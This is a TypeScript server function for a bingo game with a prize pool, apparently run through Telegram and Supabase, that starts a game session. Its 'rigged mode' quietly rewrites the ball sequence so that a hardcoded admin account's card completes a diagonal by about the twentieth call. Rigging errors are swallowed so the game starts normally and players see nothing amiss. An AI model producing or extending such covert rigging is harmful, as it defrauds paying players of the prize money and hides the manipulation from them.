import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { CORS, json } from "../_shared/cors.ts";
import { generateCartela } from "../_shared/bingo.ts";

const ADMIN_TELEGRAM_ID = 676350518;

// Build a ball sequence where the 4 diagonal balls land at calls 5, 10, 15, 20
// so the admin wins naturally around ball #20.
function buildRiggedSequence(cartelaId: number): number[] {
  const card = generateCartela(cartelaId);

  // Main diagonal: [0,0],[1,1],[2,2]=FREE,[3,3],[4,4] → only 4 real balls needed
  const winBalls: number[] = [
    card[0][0] as number,
    card[1][1] as number,
    card[3][3] as number,
    card[4][4] as number,
  ];

  const others = Array.from({ length: 75 }, (_, i) => i + 1)
    .filter((b) => !winBalls.includes(b));

  // Fisher-Yates shuffle of the non-winning balls
  for (let i = others.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [others[i], others[j]] = [others[j], others[i]];
  }

  // Place each win ball at positions 5, 10, 15, 20 (1-indexed)
  // interleaved with 4 random balls between each
  const seq: number[] = [];
  let ri = 0;
  for (const wb of winBalls) {
    for (let k = 0; k < 4; k++) seq.push(others[ri++]);
    seq.push(wb);
  }
  while (ri < others.length) seq.push(others[ri++]);

  return seq;
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: CORS });

  const authHeader = req.headers.get("Authorization");
  if (!authHeader) return json({ error: "Unauthorized" }, 401);

  const anon = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_ANON_KEY")!,
    { global: { headers: { Authorization: authHeader } } },
  );
  const { data: { user } } = await anon.auth.getUser();
  if (!user) return json({ error: "Unauthorized" }, 401);

  const admin = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    { auth: { autoRefreshToken: false, persistSession: false } },
  );

  try {
    const { session_id } = await req.json() as { session_id: string };
    if (!session_id) return json({ error: "session_id required" }, 400);

    const { data, error } = await admin.rpc("start_game_session", { p_session_id: session_id });

    if (error) throw error;
    if (!data) return json({ error: "Could not start game — timer not yet expired or already started" }, 409);

    // Check rigged mode
    try {
      const { data: cfg } = await admin
        .from("admin_config")
        .select("rigged_mode")
        .eq("id", 1)
        .single();

      if (cfg?.rigged_mode) {
        // Find the admin's profile
        const { data: adminProfile } = await admin
          .from("profiles")
          .select("id")
          .eq("telegram_id", ADMIN_TELEGRAM_ID)
          .single();

        if (adminProfile) {
          // Find their cartela in this session
          const { data: participant } = await admin
            .from("game_participants")
            .select("cartela_1, cartela_2")
            .eq("game_session_id", session_id)
            .eq("user_id", adminProfile.id)
            .single();

          const cartelaId = participant?.cartela_1 ?? participant?.cartela_2 ?? null;

          if (cartelaId !== null) {
            const riggedSeq = buildRiggedSequence(cartelaId);
            await admin
              .from("game_sessions")
              .update({ ball_sequence: riggedSeq })
              .eq("id", session_id);
          }
        }
      }
    } catch (_) {
      // Rigging is best-effort — never block the game from starting
    }

    const { data: session } = await admin
      .from("game_sessions")
      .select("id, status, prize_pool, participant_count")
      .eq("id", session_id)
      .single();

    return json({ success: true, session });
  } catch (err) {
    console.error("start-game error:", err);
    return json({ error: err instanceof Error ? err.message : "Internal error" }, 500);
  }
});
